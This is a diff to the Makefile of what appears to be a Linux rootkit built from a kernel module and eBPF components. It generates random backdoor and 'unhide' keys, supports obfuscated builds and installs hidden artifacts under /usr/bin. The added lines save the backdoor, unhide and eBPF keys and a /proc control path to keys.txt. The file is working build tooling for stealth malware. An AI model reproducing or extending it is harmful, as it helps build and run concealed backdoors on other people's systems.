@@ -16,6 +16,10 @@ UUIDGEN := $(shell uuidgen)
 KERNEL_VERSION := $(shell uname -r)
 KERNEL_BUILD_PATH := /lib/modules/$(KERNEL_VERSION)/build
 
+# Keys file location
+KEYS_FILE := keys.txt
+BUILD_DATE := $(shell date "+%Y-%m-%d %H:%M:%S")
+
 # For tests, use hardcoded keys.
 ifndef TEST_ENV
 BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
@@ -88,6 +92,21 @@ endif
 ifdef OBFUSCATE
 	@echo "\033[1;37mObfuscated build with gcc-12 compiler\033[0m"
 endif
+	@echo "Saving keys to $(KEYS_FILE)..."
+	@echo "BUILD_DATE: $(BUILD_DATE)" > $(KEYS_FILE)
+	@echo "BACKDOOR_KEY: $(BDKEY)" | sed 's/0x//' >> $(KEYS_FILE)
+	@echo "LKM_UNHIDE_KEY: $(UNHIDEKEY)" | sed 's/0x//' >> $(KEYS_FILE)
+	@echo "UI: /proc/$(PROCNAME)" >> $(KEYS_FILE)
+ifdef DEPLOY
+	@echo "BUILD_TYPE: RELEASE" >> $(KEYS_FILE)
+else
+	@echo "BUILD_TYPE: DEBUG" >> $(KEYS_FILE)
+endif
+ifdef OBFUSCATE
+	@echo "OBFUSCATED: YES" >> $(KEYS_FILE)
+else
+	@echo "OBFUSCATED: NO" >> $(KEYS_FILE)
+endif
 
 $(EBPF_BPF_OBJ): $(EBPF_C_SRC)
 	clang -O2 -g -Wall \
@@ -107,6 +126,7 @@ build-ebpf: $(EBPF_BPF_OBJ) $(EBPF_USER_BIN)
 	@echo "eBPF artifacts built successfully."
 	@echo -n "LKM ebpf KEY: "
 	@echo "\033[1;37m$(EBPFHIDEKEY)\033[0m" | sed 's/0x//'
+	@echo "EBPF_KEY: $(EBPFHIDEKEY)" | sed 's/0x//' >> $(KEYS_FILE)
 install-ebpf: build-ebpf
 	@echo "Installing eBPF artifacts into /usr/bin/$(EBPFHIDEKEY)/ ..."
 	@sudo mkdir -p /usr/bin/$(EBPFHIDEKEY)
